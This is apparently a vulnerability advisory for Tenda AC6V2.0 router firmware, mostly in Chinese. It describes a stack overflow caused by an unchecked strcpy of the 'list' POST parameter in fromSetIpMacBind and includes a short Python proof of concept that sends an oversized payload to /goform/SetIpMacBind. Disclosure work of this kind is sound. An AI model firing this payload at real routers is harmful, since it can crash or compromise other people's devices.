# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "fromSetIpMacBind"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

在函数fromSetIpMacBind中，通过用户构造post请求传入list参数，未经参数检查。在1<=bindnum<=32的时候list传入的参数会通过strcpy(mib_buf, list);传入栈中造成溢出。其中mib_value[128]。

![image-20250618232337799](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618232337799.png)

poc

```python
import requests
def send_payload(url, payload):
    params={
            'bindnum':b'10',
            'list':payload,}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500
url="http://192.168.1.1/goform/SetIpMacBind"
send_payload(url, payload)   
```

![image-20250618232217205](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618232217205.png)